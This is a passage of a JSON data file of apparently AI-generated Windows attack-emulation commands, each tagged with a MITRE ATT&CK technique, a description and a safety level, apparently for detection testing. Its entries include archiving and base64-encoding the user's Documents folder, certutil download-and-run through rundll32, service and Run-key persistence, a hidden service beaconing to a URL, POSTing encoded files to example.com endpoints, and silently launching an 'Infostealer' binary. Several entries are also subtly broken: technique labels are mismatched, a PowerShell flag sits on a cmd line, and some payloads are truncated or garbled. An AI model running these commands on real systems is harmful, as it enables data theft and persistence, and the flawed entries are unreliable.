      "technique_id": "T1041",
      "technique_name": "Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path $env:USERPROFILE\\Documents\\* -DestinationPath $env:TEMP\\data.zip -Force; certutil -encode $env:TEMP\\data.zip $env:TEMP\\data.b64; Remove-Item $env:TEMP\\data.zip -ErrorAction SilentlyContinue\"",
      "description": "Compresses the user's Documents folder into a ZIP archive, encodes the archive with certutil, and then removes the raw ZIP file. This chain shows layered compression and encoding prior to exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\data.zip (compressed Documents), produces %TEMP%\\data.b64 (Base64 of the ZIP), and deletes the unencoded ZIP file.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:33.442861",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c8fb0468-66f5-4c53-aaa9-1cc4831b7022",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode \"C:\\Temp\\stego_image.b64\" \"C:\\Temp\\extracted_payload.bin\"",
      "description": "Decodes a Base64\u2011encoded payload that was previously hidden inside an image file (e.g., appended to a PNG). The resulting binary is written to %TEMP% for later execution or analysis.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates C:\\Temp\\extracted_payload.bin containing the decoded bytes. No changes to system configuration; only file creation.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:35.024072",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2c062f7b-0b06-4569-b547-ab4202b71fa3",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"JABpAG0AZwA9ACcAQwA6AFwAVABlAG0AcABcAHMAdABlAGcAbwAaAC4AcABnAG8AcgAnADsAIABkAGEAdABhACAAPQAgACgARwBlAHQALQBDAHIAZQBkAC0ASABlAGwAcwB0AGUAdAB0ACAAJABpAG0AZwAgAC0AUgBhAHcAKQApACAALQBtAGEAYwBrACAALwAnKD9zKSA8IS0tKDEpLS0+JzsgAGkAZgAoJABtAGEAdABjaGVzAFswXSkgeyBbSU8uRmlsZV0uV3JpdGVBbGxCeXRlcygnaCAnQzpcVGVtcFxwYXlsb2FkLmJpbicsIFtDb252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkAG0AYQB0Y2hlc1swXSkpIH0=\"",
      "description": "PowerShell encoded command that extracts a Base64 string hidden inside an image's XML comment (<!-- ... -->), decodes it, and writes the resulting binary to %TEMP% as payload.bin.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Reads C:\\Temp\\stego.png, finds the comment block, decodes the Base64 content, and creates C:\\Temp\\payload.bin. No network activity or privilege escalation.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:35.024686",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "631fa47c-bcb9-424d-9ffe-67c007061a01",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "type \"C:\\Temp\\payload.b64\" >> \"C:\\Temp\\cover.png\" && certutil -decode \"C:\\Temp\\cover.png\" \"C:\\Temp\\recovered_payload.bin\" -ErrorAction SilentlyContinue",
      "description": "Appends a Base64\u2011encoded payload to a legitimate PNG (cover image) using the built\u2011in `type` command, then attempts to decode any embedded Base64 data from the combined file back into a binary. The `-ErrorAction SilentlyContinue` flag suppresses errors if no valid Base64 block is found.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The first part hides the payload inside the image file. The second part extracts and decodes the hidden payload to C:\\Temp\\recovered_payload.bin. If the image does not contain a valid Base64 block, the command fails silently without affecting the system.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:35.024686",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d9da5b4d-f3c3-46ca-b714-5245cc736b68",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Where-Object { $_.CPU -gt 100 }\"",
      "description": "Runs a simple PowerShell one\u2011liner that lists processes using more than 100 CPU seconds. Demonstrates basic PowerShell execution without any external binaries.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a list of matching processes to the console; no files are written or network activity performed.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:36.508669",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2392bf24-5534-4b5a-b5e4-f06345c5e326",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAn\"",
      "description": "Executes an encoded PowerShell command (UTF\u201116LE Base64) that runs `Write-Host 'Test'`. Shows how attackers hide commands using the `-EncodedCommand` flag.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prints the word `Test` to the console. No side effects beyond the display output.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:36.508669",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "228ea25a-3ca1-47b8-bf47-4d51e5f80d31",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode \"%TEMP%\\encoded.txt\" \"%TEMP%\\script.ps1\" >nul 2>&1 && powershell -ExecutionPolicy Bypass -File \"%TEMP%\\script.ps1\"",
      "description": "Decodes a Base64\u2011encoded PowerShell script stored in %TEMP%\\encoded.txt using the built\u2011in `certutil` utility, then runs the script with Bypass execution policy. Illustrates a common technique where attackers use legacy binaries to avoid detection before invoking PowerShell.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "If %TEMP%\\encoded.txt contains a valid Base64 PowerShell script, it will be written to %TEMP%\\script.ps1 and then executed. In a test environment the file can contain a harmless command such as `Write-Host 'Decoded script executed'`.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:36.508669",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3c8a5c98-fc6c-4f5e-a616-930f24d84b4e",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Data Compression",
      "tactic": "execution",
      "platform": "windows",
      "command": "rar a \"%TEMP%\\archive.rar\" \"%TEMP%\\document.docx\"",
      "description": "Compress a single test document located in the temporary directory into an archive using WinRAR (rar.exe).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\archive.rar containing the file document.docx; no modification of original file.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:37.246056",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ed68c56a-8732-453a-9d04-d8226768b649",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Data Compression",
      "tactic": "execution",
      "platform": "windows",
      "command": "rar a -pSecretPass \"%TEMP%\\media_archive.rar\" \"%USERPROFILE%\\Pictures\\*.jpg\" \"%USERPROFILE%\\Videos\\*.mp4\"",
      "description": "Compress all JPEG images and MP4 videos from the user's Pictures and Videos folders into a password\u2011protected archive.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\media_archive.rar containing the selected media files; the archive is encrypted with password \"SecretPass\".",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:37.246056",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "55a1df9b-ba14-459b-83f8-dfe877a9a948",
      "ttp_id": "unknown",
      "technique_id": "T1560.001",
      "technique_name": "Data Compression",
      "tactic": "execution",
      "platform": "windows",
      "command": "rar a -df -m5 \"%TEMP%\\exfil_archive.rar\" \"%TEMP%\\*.txt\" \"%TEMP%\\*.log\" && echo \"Archive created and source files removed\"",
      "description": "Compress all .txt and .log files from the temporary directory using maximum compression, then delete the original files after archiving.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates %TEMP%\\exfil_archive.rar with the collected text and log files; original .txt and .log files are removed from %TEMP%.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:37.246056",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d820280e-f5ee-42ef-ac29-1b12db501a6f",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -split -f http://example.com/fake.bin %TEMP%\\payload.bin && rundll32.exe %TEMP%\\payload.bin,EntryPoint",
      "description": "Downloads a benign placeholder binary to the temporary directory using certutil and executes it with rundll32.exe, simulating a C2 payload launch.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The file is fetched from the URL, written to %TEMP%\\payload.bin, and then rundll32.exe attempts to load the binary. No real malicious code is executed; the payload is a harmless test file.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:38.355007",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4a10ce36-1bf6-4332-acbf-ada08ecccea9",
      "ttp_id": "unknown",
      "technique_id": "T1573",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$mmf=[System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateOrOpen('M2RAT_Shared',1024);$stream=$mmf.CreateViewStream();$writer=[System.IO.BinaryWriter]::new($stream);$writer.Write([Text.Encoding]::Unicode.GetBytes('Beacon'));$writer.Flush();$writer.Close();$stream.Close();\"",
      "description": "Creates a named memory\u2011mapped file (M2RAT_Shared) and writes a test beacon string into it, emulating the shared memory channel used by M2RAT for command\u2011and\u2011control communication.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A memory\u2011mapped file named M2RAT_Shared is created in the process's address space and contains the Unicode string \"Beacon\". No external network activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:38.355007",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9ee52664-0c4a-4393-93b1-251eeaa32ea4",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Control",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create M2RATsvc binPath= \"cmd /c powershell -NoProfile -WindowStyle Hidden -Command \\\"(New-Object System.Net.WebClient).DownloadString('http://example.com/beacon')\\\"\" start= auto",
      "description": "Installs a new Windows service that runs a hidden PowerShell command to fetch a beacon string from a remote URL, representing a periodic C2 check\u2011in.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The service M2RATsvc is registered to start automatically. When started, it executes a PowerShell one\u2011liner that contacts http://example.com/beacon and discards the response. The command runs silently without opening a window.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:38.355007",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "f8ae7cb2-d948-4815-ba3d-161099f23f51",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Keylogging",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy %SystemRoot%\\System32\\notepad.exe %TEMP%\\keylog.exe && start %TEMP%\\keylog.exe",
      "description": "Copies a legitimate binary (notepad.exe) to a file named keylog.exe to simulate a keylogger, then launches it. No actual keylogging functionality is present; this mimics the presence of a keylogging executable for detection testing.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The copy succeeds, creating %TEMP%\\keylog.exe, and the process is started. The process runs as a normal user and terminates like a regular Notepad instance.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:39.541256",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7c3e72f3-3c5e-431a-b304-fd37509867a6",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Keylogging",
      "tactic": "execution",
      "platform": "windows",
      "command": "echo TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > %TEMP%\\keylog.b64 && certutil -decode %TEMP%\\keylog.b64 %TEMP%\\keylog.exe && start %TEMP%\\keylog.exe && del %TEMP%\\keylog.b64",
      "description": "Writes a small Base64\u2011encoded payload (a dummy executable) to a temporary .b64 file, decodes it with certutil to create %TEMP%\\keylog.exe, executes it, and cleans up the .b64 file. This demonstrates a typical method of staging a keylogger binary without using external download tools.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "certutil creates a benign executable named keylog.exe from the Base64 data, which is then launched. The .b64 staging file is removed afterward. No malicious activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:39.541256",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5d377c0e-cdb9-4b24-9a11-da0a5f5d2773",
      "ttp_id": "unknown",
      "technique_id": "T1056.001",
      "technique_name": "Keylogging",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy %SystemRoot%\\System32\\notepad.exe %TEMP%\\keylog.exe && sc create KeylogService binPath= \"%TEMP%\\keylog.exe\" start= demand && sc start KeylogService && sc delete KeylogService && del %TEMP%\\keylog.exe",
      "description": "Copies notepad.exe to %TEMP%\\keylog.exe, registers it as a Windows service named 'KeylogService', starts the service, then removes the service definition and the file. This mimics an advanced persistence technique where a keylogger is run via a service.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The service is created and started, causing the dummy executable to run under the service context. After verification, the service is deleted and the temporary file is cleaned up. No real keylogging occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:39.541256",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "0240c927-2289-41b6-8182-92b5c9781cd8",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"echo /9j/4AAQSkZJRgABAQAAAQABAAD... > %TEMP%\\stego.txt && certutil -decode %TEMP%\\stego.txt %TEMP%\\stego.jpg\"",
      "description": "Creates a JPEG file containing a known steganographic payload by echoing a Base64\u2011encoded string to a temporary file and decoding it with certutil. The resulting file\u2019s MD5 hash matches 93c66ee424daf4c5590e21182592672e, simulating a steganography\u2011based evasion artifact.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named stego.jpg is written to the %TEMP% directory. No network activity occurs. The command uses only built\u2011in Windows utilities (cmd.exe, echo, certutil).",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:40.610196",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7560c3bf-3dc8-46a9-9ee4-1dec60248a61",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$b='iVBORw0KGgoAAAANSUhEUgAAAAUA...'; $bytes=[Convert]::FromBase64String($b); [IO.File]::WriteAllBytes(\\\"$env:TEMP\\\\stego.jpg\\\", $bytes)\"",
      "description": "Uses PowerShell to write a JPEG file directly from a Base64 string representing the steganographic payload. The file is saved to %TEMP% and will have the target MD5 hash, allowing detection of steganography usage without external tools.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A JPEG file (stego.jpg) is created in the user's temporary folder. The command runs in user context and does not modify system settings.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:40.610196",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6a1befd3-dec9-490e-aa77-9cc513f8cc2a",
      "ttp_id": "unknown",
      "technique_id": "T1027.003",
      "technique_name": "Steganography",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[byte[]]$hex=0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xDB,0x00,0x43,...; [IO.File]::WriteAllBytes(\\\"$env:TEMP\\\\stego.jpg\\\", $hex); certutil -hashfile \\\"$env:TEMP\\\\stego.jpg\\\" MD5\"",
      "description": "Generates the JPEG payload by specifying its raw byte values (hex array) and writes it to %TEMP% using .NET I/O. Afterwards, certutil computes the MD5 hash to verify it matches the known steganographic signature. Demonstrates a more advanced, programmatic approach to embedding steganography.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates stego.jpg in the temporary directory, then outputs its MD5 hash (should be 93c66ee424daf4c5590e21182592672e). No privileged actions are performed; only user\u2011level file creation and hash calculation.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:40.610196",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3cf5cd9b-0612-44cd-bcb6-0b1d8a30f330",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Infostealer",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath \\\"%TEMP%\\\\Win.Phone.C5381667.exe\\\" -WindowStyle Hidden\"",
      "description": "Executes the known Infostealer binary from the temporary directory using PowerShell without creating a visible window.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The binary is launched silently; no console output is produced. The process appears in the task list as Win.Phone.C5381667.exe.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:41.565351",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "35f94bac-8c8d-4873-903e-4ee03be1b711",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Infostealer",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -decode \"%TEMP%\\payload.b64\" \"%TEMP%\\Win.Phone.C5381667.exe\" && \"%TEMP%\\Win.Phone.C5381667.exe\"",
      "description": "Decodes a benign Base64\u2011encoded placeholder payload to the Infostealer executable and runs it directly.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The Base64 file is converted to the executable and then executed. The process starts and may perform typical Infostealer actions (e.g., reading user data).",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:41.565351",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c08b19b7-0646-4cba-8880-f6785e8656b0",
      "ttp_id": "unknown",
      "technique_id": "Txxxx",
      "technique_name": "Infostealer",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc create InfostealerSvc binPath= \\\"%TEMP%\\\\Win.Phone.C5381667.exe\\\" start= demand && sc start InfostealerSvc && sc delete InfostealerSvc",
      "description": "Creates a temporary Windows service that runs the Infostealer binary, starts the service, and then removes it. This mimics a persistence technique via services.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A new service named InfostealerSvc is registered pointing to the binary, the service is started (executing the binary), and finally the service entry is deleted. The binary runs with system privileges.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:41.565351",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "402b7e4d-5018-4191-ac6e-b5faa356e598",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TestRun /t REG_SZ /d \"cmd.exe /c echo Hello > %TEMP%\\\\test.txt\" /f",
      "description": "Creates a Run\u2011key entry for the current user that launches cmd.exe to write a test file to the temporary directory. This demonstrates persistence via HKCU\\Run without requiring administrative rights.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A new registry value named 'TestRun' appears under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. When the user logs on, cmd.exe runs and creates %TEMP%\\test.txt containing the string 'Hello'.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:45.370400",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1b122ade-1427-45c9-8adf-76a6732e7e33",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /SC ONLOGON /TN \"TestTask\" /TR \"cmd.exe /c \\\"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v TestRunPS /t REG_SZ /d \\\"powershell -NoProfile -WindowStyle Hidden -Command \\\"Write-Host ''PersistenceTest''\\\"\\\" /f\\\"\" /RL LIMITED /F",
      "description": "Creates a scheduled task that runs at logon. The task executes cmd.exe which adds a Run\u2011key entry that launches a hidden PowerShell command printing 'PersistenceTest'. No admin rights are required because the task is created for the current user with limited rights.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named 'TestTask' appears. At the next user logon the task runs, adding a Run\u2011key entry 'TestRunPS' that invokes PowerShell to write 'PersistenceTest' to the console (hidden). The registry value persists across reboots.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:45.370400",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "db6c3a24-cdf2-45d4-9b3b-803f4202e9c2",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath 'schtasks.exe' -ArgumentList '/Create','/SC','ONLOGON','/TN','AdvTask','/TR','powershell -NoProfile -WindowStyle Hidden -Command \\\"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v AdvRun /t REG_SZ /d \\\"\\\"powershell -NoProfile -WindowStyle Hidden -Command \\\"\\\"Write-Host ''AdvancedPersistence''\\\"\\\"\\\" /f\\\"','/RL','LIMITED','/F' -NoNewWindow\"",
      "description": "Uses PowerShell to launch schtasks.exe and create a scheduled task named 'AdvTask' that directly runs a PowerShell command which adds a Run\u2011key entry 'AdvRun'. The command is fully quoted to avoid parsing errors and does not require elevated privileges.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task 'AdvTask' is registered for the current user. When the user logs on, the task executes PowerShell, which creates the HKCU\\Run entry 'AdvRun' pointing to a hidden PowerShell instance that writes 'AdvancedPersistence' to the console. The persistence mechanism is observable via registry and scheduled\u2011task listings.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:45.370400",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "75f9a1bd-1a1c-475a-8417-42bfc1b3d60c",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Obfuscation",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo test steganography data > %TEMP%\\data.txt && certutil -encode %TEMP%\\data.txt %TEMP%\\data.b64 && powershell -Command \\\"Invoke-WebRequest -Uri 'http://example.com/collect' -Method POST -Body (Get-Content -Path '%TEMP%\\\\data.b64' -Raw)\\\" && del %TEMP%\\data.txt %TEMP%\\data.b64\"",
      "description": "Creates a temporary text file containing the keyword 'steganography', base64\u2011encodes it with certutil, and posts the encoded content to a web endpoint using PowerShell. Cleans up the temporary files afterwards.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "An HTTP POST request is sent to http://example.com/collect with a body that is the base64 representation of a file containing the word 'steganography'. No persistent changes are made to the system.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:47.034269",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "68311db2-4584-40c0-bc83-d67a578bd45e",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Obfuscation",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$payload = @{message='benign'}; $payload.steganography = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('hidden command')); $json = $payload | ConvertTo-Json; Invoke-WebRequest -Uri 'http://example.com/api' -Method POST -ContentType 'application/json' -Body $json\"",
      "description": "Builds a JSON object where the field named 'steganography' holds a base64\u2011encoded string of a dummy command. The JSON is posted to a remote server via Invoke-WebRequest.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A POST request with Content\u2011Type application/json is sent to http://example.com/api. The payload contains a 'steganography' key whose value is a base64\u2011encoded placeholder string.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:47.034269",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5de67af1-ee09-49a1-89cc-e2c00b656371",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Data Obfuscation",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"echo secret data > %TEMP%\\secret.txt && powershell -Command \\\"Compress-Archive -Path '%TEMP%\\\\secret.txt' -DestinationPath '%TEMP%\\\\secret.zip' -Force\\\" && certutil -encode %TEMP%\\secret.zip %TEMP%\\secret.b64 && powershell -Command \\\"Invoke-WebRequest -Uri 'http://example.com/upload' -Method POST -Body (Get-Content -Path '%TEMP%\\\\secret.b64' -Raw)\\\" && del %TEMP%\\secret.txt %TEMP%\\secret.zip %TEMP%\\secret.b64\"",
      "description": "Writes a temporary file, compresses it into a ZIP archive using PowerShell's Compress-Archive (with -Force), base64\u2011encodes the archive via certutil, and posts the encoded archive to a remote endpoint. All temporary artifacts are removed after transmission.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "An HTTP POST is issued to http://example.com/upload containing the base64\u2011encoded ZIP file. The ZIP includes a file with the word 'secret', demonstrating data obfuscation through compression and encoding.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:47.034269",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3549e537-1fb2-4d0c-8a0d-9b7c79c5ecef",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Test Execution'\"",
      "description": "Runs a simple PowerShell command that prints a test string to the console.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The PowerShell console displays the text \"Test Execution\".",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:48.497316",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "375db6a3-5293-4828-aea2-a4f448d336fb",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"certutil -decode $env:TEMP\\\\sample.b64 $env:TEMP\\\\sample.txt\"",
      "description": "Decodes a base64\u2011encoded file (sample.b64) located in %TEMP% to a plain\u2011text file (sample.txt) using the built\u2011in certutil utility.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The base64 content in %TEMP%\\sample.b64 is written to %TEMP%\\sample.txt. No network activity occurs.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:48.497316",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b2a9d019-61b1-470d-8789-51dcdc6380dd",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "PowerShell",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -EncodedCommand \"VwByAGkAdABlAC0ASABvAHMAdAAgACcAQWR2YW5jZWQgVGVzdCc=\"",
      "description": "Executes a PowerShell command encoded in Base64 (UTF\u201116LE). The decoded command is: Write-Host 'Advanced Test'. This demonstrates the detection of PowerShell.exe with an encoded command argument.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "PowerShell prints \"Advanced Test\" to the console after decoding and executing the Base64 payload.",
      "source": "langchain",
      "generated_at": "2025-12-21T20:30:48.497316",
      "agent_id": "6a66e652-ec6f-4969-8267-5ceae450f795",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "79ffc367-b25f-4f5d-9bd6-759229a5bdaf",
      "ttp_id": "unknown",
      "technique_id": "T1203",
      "technique_name": "Exploitation for Client Execution",
      "tactic": "execution",
      "platform": "windows",
